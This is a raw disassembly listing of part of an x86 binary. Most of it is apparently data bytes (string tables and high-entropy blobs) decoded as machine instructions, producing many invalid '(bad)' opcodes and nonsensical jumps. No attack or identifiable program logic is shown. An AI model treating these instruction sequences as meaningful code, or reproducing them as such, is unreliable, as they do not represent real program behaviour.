  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	nop
  413f01:	inc    BYTE PTR [ebx+0xd1dc99]
  413f07:	add    BYTE PTR ds:0xc9000001,al
  413f0d:	rol    DWORD PTR [ebp+0x2c],0x49
  413f11:	inc    esp
  413f12:	sub    BYTE PTR [ebp-0x32a261c2],dh
  413f18:	jnp    0x413eac
  413f1a:	cmp    DWORD PTR [esi+0x7a],esi
  413f1d:	ds jl  0x413f3f
  413f20:	in     al,dx
  413f21:	ror    BYTE PTR [edx-0x2a],cl
  413f24:	mov    gs,WORD PTR [ebp+0x4ce8e383]
  413f2a:	hlt    
  413f2b:	popa   
  413f2c:	mov    ah,0x16
  413f2e:	shl    eax,0xbb
  413f31:	out    dx,eax
  413f32:	jp     0x413f43
  413f34:	ins    BYTE PTR es:[edi],dx
  413f35:	sbb    BYTE PTR [edx-0x1a],0x8c
  413f39:	jge    0x413f7c
  413f3b:	xor    ch,BYTE PTR [ebx-0x3e]
  413f3e:	lea    ebp,[esi-0x5f7e3a6a]
  413f44:	mov    ah,0x3b
  413f46:	mov    ah,BYTE PTR [ebx+0x2e]
  413f49:	inc    esp
  413f4a:	pop    ebx
  413f4b:	push   cs
  413f4c:	jle    0x413fa3
  413f4e:	or     DWORD PTR [eax-0x14196c53],edx
  413f54:	je     0x413f18
  413f56:	and    esi,DWORD PTR [ecx+0x62]
  413f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f5a:	push   esp
  413f5b:	rol    DWORD PTR [edx+0xf],0x54
  413f5f:	sbb    BYTE PTR [ebp+0x3dcb0124],0x56
  413f66:	xor    eax,0x729bad49
  413f6b:	aam    0x12
  413f6d:	ins    DWORD PTR es:[edi],dx
  413f6e:	mov    bl,0xf9
  413f70:	jnp    0x413f2c
  413f72:	inc    esi
  413f73:	xchg   edi,eax
  413f74:	fdiv   DWORD PTR [eax]
  413f76:	outs   dx,DWORD PTR ds:[esi]
  413f77:	push   es
  413f78:	call   FWORD PTR [edi-0x4d]
  413f7b:	xchg   edx,eax
  413f7c:	or     BYTE PTR [edx-0x73],ch
  413f7f:	xor    al,0xa9
  413f81:	jno    0x413f11
  413f83:	add    DWORD PTR [eax],ebx
  413f85:	les    edi,FWORD PTR [eax+0x7]
  413f88:	ja     0x413fd1
  413f8a:	mov    ds:0x328eba7b,al
  413f8f:	leave  
  413f90:	out    dx,eax
  413f91:	xlat   BYTE PTR ds:[ebx]
  413f92:	sub    eax,0x9ffbc7ee
  413f97:	outs   dx,DWORD PTR ds:[esi]
  413f98:	add    al,0xda
  413f9a:	fistp  QWORD PTR [edx+0x3f]
  413f9d:	imul   edi,DWORD PTR [esi],0x958cfdc1
  413fa3:	gs pop eax
  413fa5:	das    
  413fa6:	iret   
  413fa7:	xor    BYTE PTR [ebx+ebp*4-0x4df0ecda],ah
  413fae:	fld    QWORD PTR [edi+0x76]
  413fb1:	(bad)  
  413fb2:	fsubr  DWORD PTR [eax+ebx*2]
  413fb5:	in     al,dx
  413fb6:	stc    
  413fb7:	pop    ebx
  413fb8:	ret    
  413fb9:	push   ecx
  413fba:	adc    al,0x85
  413fbc:	fsub   QWORD PTR [eax-0x381f67f8]
  413fc2:	scas   al,BYTE PTR es:[edi]
  413fc3:	cmp    DWORD PTR [eax+0xb],0x6e
  413fc7:	cmp    dl,dh
  413fc9:	fisub  DWORD PTR [edi-0x3c]
  413fcc:	test   ebp,ebx
  413fce:	hlt    
  413fcf:	or     cl,bh
  413fd1:	ds cmc 
  413fd3:	or     bh,BYTE PTR [esi+ebp*1-0x52]
  413fd7:	(bad)  
  413fd9:	pop    ebx
  413fda:	mov    eax,ds:0x76a02045
  413fdf:	adc    eax,ecx
  413fe1:	not    edi
  413fe3:	leave  
  413fe4:	inc    ecx
  413fe5:	inc    esi
  413fe6:	(bad)  
  413fe7:	repz xchg ecx,eax
  413fe9:	push   eax
  413fea:	dec    esi
  413feb:	dec    edi
  413fec:	push   0x824efd08
  413ff1:	(bad)  
  413ff3:	test   al,bh
  413ff5:	sahf   
  413ff6:	inc    ecx
  413ff7:	jno    0x413fe7
  413ff9:	mov    edx,0xe20ee2f2
  413ffe:	xchg   edx,eax
  413fff:	fwait
  414000:	scas   eax,DWORD PTR es:[edi]
  414001:	ret    
  414002:	xchg   ecx,eax
  414003:	mov    esi,edi
  414005:	jmp    0xe089:0x148cb95f
  41400c:	adc    eax,0xf46d15b4
	...
  414071:	add    BYTE PTR [eax],al
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x1ce0:0x56d52e96
  414083:	out    dx,al
  414084:	loope  0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    eax,0x78000001
  41408d:	jl     0x414081
  41408f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414090:	xchg   esp,eax
  414091:	mov    edi,0x836d2a64
  414096:	mov    WORD PTR [edx],ss
  414098:	sub    ch,BYTE PTR cs:[edx+0x68d6edf7]
  41409f:	inc    esi
  4140a0:	fdiv   DWORD PTR [edi-0xd]
  4140a3:	fs and dl,bl
  4140a6:	cwde   
  4140a7:	stc    
  4140a8:	fst    st(0)
  4140aa:	ss mov cl,0xa5
  4140ad:	je     0x41409f
  4140af:	jo     0x414056
  4140b1:	pop    edx
  4140b2:	stos   BYTE PTR es:[edi],al
  4140b3:	jns    0xfca15023
  4140b9:	int    0xa9
  4140bb:	scas   al,BYTE PTR es:[edi]
  4140bc:	dec    esp
  4140bd:	outs   dx,DWORD PTR ds:[esi]
  4140be:	inc    edi
  4140bf:	mov    bl,0x7a
  4140c1:	imul   edi,DWORD PTR [edx-0x5c],0xc8f61de6
  4140c8:	cld    
  4140c9:	xlat   BYTE PTR ds:[ebx]
  4140ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140cb:	jle    0x41408d
  4140cd:	lahf   
  4140ce:	pop    ebp
  4140cf:	and    eax,0x949ea828
  4140d4:	imul   DWORD PTR [edi-0x49]
  4140d7:	jl     0x4140ea
  4140d9:	xchg   bh,bl
  4140db:	cld    
  4140dc:	or     DWORD PTR [edi],edx
  4140de:	lea    edi,[edi]
  4140e0:	adc    al,0x2f
  4140e2:	(bad)  
  4140e3:	inc    ebx
  4140e4:	faddp  st(7),st
  4140e6:	or     edi,ebp
  4140e8:	ds mov ds,edi
  4140eb:	mov    bl,0x6c
  4140ed:	(bad)  
  4140ef:	add    eax,0x78555d76
  4140f4:	sbb    BYTE PTR [ebx+0x69ece37b],dh
  4140fa:	cld    
  4140fb:	out    0x81,eax
  4140fd:	or     al,BYTE PTR [eax+ebx*2-0x3fa9ebe0]
  414104:	dec    ebx
  414105:	repnz mov ebp,0xa4a90a9b
  41410b:	jmp    0xf366:0x41e72809
  414112:	xchg   edi,eax
  414113:	push   0x2e
  414115:	jae    0x4140f9
  414117:	aam    0x57
  414119:	adc    BYTE PTR [edx+0x39fedb65],0x57
  414120:	dec    ebp
  414121:	sub    al,0x15
  414123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414124:	xchg   ebp,eax
  414125:	pop    ebx
  414126:	aas    
  414127:	fsub   DWORD PTR es:[ecx]
  41412a:	jb     0x414184
  41412c:	fidivr WORD PTR [esp+edx*8-0x3186ec87]
  414133:	jnp    0x414188
  414135:	lods   al,BYTE PTR ds:[esi]
  414136:	mov    eax,0x6d157732
  41413b:	out    dx,eax
  41413c:	syscall 
  41413e:	sbb    esp,edx
  414140:	sbb    esi,DWORD PTR [esi-0x59]
  414143:	fcomp  QWORD PTR ss:[edx+0x38]
  414147:	cmp    al,0x33
  414149:	inc    eax
  41414a:	mov    ch,0x81
  41414c:	push   esp
  41414d:	fsubr  DWORD PTR [ebx-0x13]
  414150:	mov    bh,0xaf
  414152:	pusha  
  414153:	xlat   BYTE PTR ds:[ebx]
  414154:	xor    ebp,eax
  414156:	hlt    
  414157:	sub    DWORD PTR [ebx],ebp
  414159:	repz int3 
  41415b:	imul   edx,DWORD PTR [ecx],0xde912fcf
  414161:	in     al,dx
  414162:	inc    edx
  414163:	sbb    DWORD PTR [esi-0x26a71cc8],edx
  414169:	popf   
  41416a:	adc    eax,0x3844d68
  41416f:	cli    
  414170:	(bad)  
  414171:	xchg   ebp,eax
  414172:	lahf   
  414173:	std    
  414174:	(bad)  [edi-0x11af0c0d]
  41417a:	int    0xa1
  41417c:	leave  
  41417d:	inc    ebp
  41417e:	jno    0x41411e
  414180:	cmp    esi,DWORD PTR [eax+0x61]
  414183:	(bad)  
  414185:	ja     0x41416c
  414187:	jle    0x41412e
  414189:	mov    al,0xf0
  41418b:	jl     0x414186
  41418d:	mov    WORD PTR [ecx-0x2b],?
  414190:	add    BYTE PTR ss:[eax],al
	...
  4141f3:	add    BYTE PTR [edx],al
  4141f5:	adc    al,BYTE PTR [ecx]
  4141f7:	mov    ds:0xb3a2b311,eax
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	lods   eax,DWORD PTR ds:[esi]
  414201:	cmp    DWORD PTR [edi+0x57],esp
  414204:	out    0xd3,al
  414206:	add    BYTE PTR [eax],al
  414208:	add    eax,0x96000001
  41420d:	add    eax,0xe618ac12
  414212:	sub    edx,DWORD PTR [ebx+0x1e71cfb8]
  414218:	sbb    bl,BYTE PTR [ecx-0x5]
  41421b:	add    eax,edi
  41421d:	pop    ecx
  41421e:	xchg   edx,eax
  41421f:	cld    
  414220:	inc    esp
  414221:	and    eax,edi
  414223:	aas    
  414224:	fs ja  0x41424f
  414227:	loope  0x4141b3
  414229:	(bad)  
  41422a:	dec    edx
  41422b:	pop    ss
  41422c:	xor    bh,bl
  41422e:	inc    esi
  41422f:	not    BYTE PTR [ebp-0x34cd7a2]
  414235:	cwde   
  414236:	cld    
  414237:	xor    ch,bl
  414239:	daa    
  41423a:	xor    ch,0x33
  41423d:	sti    
  41423e:	inc    esi
  41423f:	push   eax
  414240:	mov    edi,0x74de6b2e
  414245:	(bad)  
  414246:	pop    esp
  414247:	add    ah,ah
  414249:	mov    esi,0xcaa79f06
  41424e:	mov    al,0x7d
  414250:	ds inc edx
  414252:	or     ecx,esi
  414254:	out    0x89,eax
  414256:	push   0x60
  414258:	mov    edi,0x53e0b024
  41425d:	loop   0x414296
  41425f:	sub    cl,dl
  414261:	cmp    edi,DWORD PTR [esi-0x63]
  414264:	mul    BYTE PTR [ecx-0x50]
  414267:	jmp    0x80118100
  41426c:	in     al,dx
  41426d:	inc    ebp
  41426e:	adc    BYTE PTR [esi-0x5f816fbe],dl
  414274:	jno    0x414299
  414276:	push   eax
  414277:	add    dl,BYTE PTR [edx]
  414279:	mov    ds:0xa709541f,eax
  41427e:	jb     0x414296
  414280:	ror    BYTE PTR ds:0x8189813c,cl
  414286:	fcomp  QWORD PTR [edx]
  414288:	call   0x83155be1
  41428d:	aas    
  41428e:	dec    ebx
  41428f:	add    eax,0xf58df716
  414294:	aam    0x2f
  414296:	jmp    0x41424a
  414298:	loopne 0x414242
  41429a:	lock xchg edx,eax
  41429c:	xchg   edx,eax
  41429d:	int3   
  41429e:	and    BYTE PTR [edi],dh
  4142a0:	dec    ebp
  4142a1:	push   ecx
  4142a2:	(bad)  
  4142a3:	lock mov ebx,0xf5ed8b3d
  4142a9:	dec    esp
  4142aa:	pop    edx
  4142ab:	lahf   
  4142ac:	pop    ebx
  4142ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142ae:	xchg   esi,eax
  4142af:	iret   
  4142b0:	mov    fs,WORD PTR [edx-0xf]
  4142b3:	adc    BYTE PTR [edx],bl
  4142b5:	sub    eax,0xded56a77
  4142ba:	loopne 0x4142d4
  4142bc:	mov    BYTE PTR [ebx-0x22],cl
  4142bf:	(bad)  
  4142c0:	cli    
  4142c1:	call   0x2b0:0xa4a1f557
  4142c8:	inc    ebx
  4142c9:	jmp    0xafef:0x1915f2b
  4142d0:	call   0xa83d:0x85eaa45e
  4142d7:	dec    ebx
  4142d8:	pop    ss
  4142d9:	loope  0x4142c5
  4142db:	and    BYTE PTR [edi+0x38ca8cf1],dl
  4142e1:	ret    0x2c88
  4142e4:	xor    ecx,ebp
  4142e6:	push   esp
  4142e7:	sbb    eax,0x2e5216cd
  4142ec:	inc    ecx
  4142ed:	mov    dl,0x9e
  4142ef:	rol    bl,1
  4142f1:	sub    DWORD PTR [esi+0x37c3f548],0x33428404
  4142fb:	mov    WORD PTR [edx+ecx*4-0x70d7b3bf],gs
  414302:	clc    
  414303:	pop    es
  414304:	jbe    0x414362
  414306:	iret   
  414307:	xchg   esp,eax
  414308:	cmc    
  414309:	(bad)
  41430c:	test   BYTE PTR [ebp+eiz*4-0x7b],dl
  414310:	(bad)  
	...
  414371:	add    BYTE PTR [eax],al
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	arpl   WORD PTR [esi-0x2b147f12],cx
  414386:	add    BYTE PTR [eax],al
  414388:	add    eax,0x3f000001
  41438d:	(bad)  
  41438e:	inc    edx
  41438f:	aad    0xdb
  414391:	mov    esi,DWORD PTR [esi]
  414393:	jle    0x414364
  414395:	push   ebp
  414396:	mov    DWORD PTR [edx-0x392ea80f],0x84efd25
  4143a0:	sahf   
  4143a1:	mov    bl,0x3d
  4143a3:	sbb    ch,BYTE PTR [edi+0x4338818d]
  4143a9:	and    eax,DWORD PTR [esi+0x1e0e6ee3]
  4143af:	sbb    ebp,DWORD PTR [esi-0xe]
  4143b2:	cmp    BYTE PTR [esi],bh
  4143b4:	mov    ecx,0xb484c28c
  4143b9:	inc    ebx
  4143ba:	lock sbb DWORD PTR [edi],ebp
  4143bd:	pop    eax
  4143be:	imul   ebp,DWORD PTR [ebp+0x6fd6c4fc],0xeab64267
  4143c8:	cli    
  4143c9:	addr16 sti 
  4143cb:	fwait
  4143cc:	mov    ds:0x1a4f1459,al
  4143d1:	scas   eax,DWORD PTR es:[edi]
  4143d2:	jle    0x414357
  4143d4:	and    edi,DWORD PTR [ebx-0x1c]
  4143d7:	fisttp DWORD PTR [ebx-0x380e346]
  4143dd:	mov    eax,0xd2dbcae9
  4143e2:	jmp    0x414410
  4143e4:	push   ds
  4143e5:	mov    dl,dl
  4143e7:	idiv   BYTE PTR ds:0xc49e357d
  4143ed:	loop   0x4143bf
  4143ef:	jp     0x414414
  4143f1:	sbb    al,0x45
  4143f3:	in     eax,dx
  4143f4:	lods   al,BYTE PTR ds:[esi]
  4143f5:	and    ch,bh
  4143f7:	out    dx,eax
  4143f8:	sbb    BYTE PTR [esi],bh
  4143fa:	xor    BYTE PTR [eax],0x57
  4143fd:	jns    0x4143f0
  4143ff:	fwait
  414400:	sub    eax,DWORD PTR [esi]
  414402:	xchg   esi,eax
  414403:	int    0x2e
  414405:	inc    eax
  414406:	adc    BYTE PTR [ecx],ch
  414408:	adc    al,0xeb
  41440a:	push   esp
  41440b:	inc    eax
  41440c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41440d:	cmp    eax,0xa44c3cf7
  414412:	retf   0xc72a
  414415:	outs   dx,DWORD PTR ds:[esi]
  414416:	sahf   
  414417:	mov    dh,BYTE PTR [ecx]
  414419:	sbb    esi,DWORD PTR [ecx+ebp*1-0x45]
  41441d:	cmp    eax,0x7ef28ab1
  414422:	ret    0xad64
  414425:	int3   
  414426:	test   eax,0x198b8ad4
  41442b:	add    dl,BYTE PTR [edx+0x4f]
  41442e:	push   ds
  41442f:	jo     0x41448b
  414431:	mov    dh,0xbd
  414433:	xchg   BYTE PTR [ebp-0x65e8f88a],ch
  414439:	sar    DWORD PTR [edi-0x56],cl
  41443c:	cdq    
  41443d:	dec    edx
  41443e:	cwde   
  41443f:	ds push eax
  414441:	pop    ecx
  414442:	and    dh,BYTE PTR [ebx+0x40b8d9e4]
  414448:	inc    edi
  414449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41444a:	mov    al,0xf9
  41444c:	popa   
  41444d:	hlt    
  41444e:	xlat   BYTE PTR ds:[ebx]
  41444f:	dec    edx
  414450:	jno    0x4144bd
  414452:	inc    esi
  414453:	enter  0x99ad,0xf6
  414457:	cmp    eax,0xf300f861
  41445c:	test   al,0x89
  41445e:	shl    eax,cl
  414460:	mov    ds:0x73418e82,eax
  414465:	push   cs
  414466:	mul    ebx
  414468:	(bad)  
  414469:	jb     0x414434
  41446b:	mov    bl,0xdd
  41446d:	mov    ch,0x86
  41446f:	xor    ecx,DWORD PTR [ecx+0x21]
  414472:	ror    BYTE PTR [edi-0x3],cl
  414475:	sbb    DWORD PTR [edx],ecx
  414477:	nop
  414478:	loop   0x414427
  41447a:	test   DWORD PTR [esi+0x6924d5fc],0xf73b3a4
  414484:	mov    ch,0xe1
  414486:	jb     0x414443
  414488:	push   es
  414489:	jae    0x414441
  41448b:	ja     0x414421
  41448d:	arpl   WORD PTR [eax+0xe96],sp
	...
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x72]
  414501:	cmp    BYTE PTR [edi+0xd5f09c],ah
  414507:	add    BYTE PTR ds:0x2a000001,al
  41450d:	cmp    BYTE PTR [edx],dh
  41450f:	fdiv   st(0),st
  414511:	fdecstp 
  414513:	or     ebx,DWORD PTR [ebx]
  414515:	ins    DWORD PTR es:[edi],dx
  414516:	out    0x2c,eax
  414518:	test   BYTE PTR [ebp+eax*8-0x24abc2a4],al
  41451f:	adc    dl,BYTE PTR [esp+edi*4-0x61c03c97]
  414526:	ret    0x4ae8
  414529:	dec    edi
  41452a:	es pushf 
  41452c:	loope  0x4144cc
  41452e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41452f:	popf   
  414530:	or     DWORD PTR [ebx+0x5f],ecx
  414533:	cwde   
  414534:	xor    DWORD PTR [edx+ebp*4],esp
  414537:	sub    esp,DWORD PTR [edx-0x59]
  41453a:	xor    BYTE PTR [si-0x4367],0x72
  414540:	xchg   ebx,eax
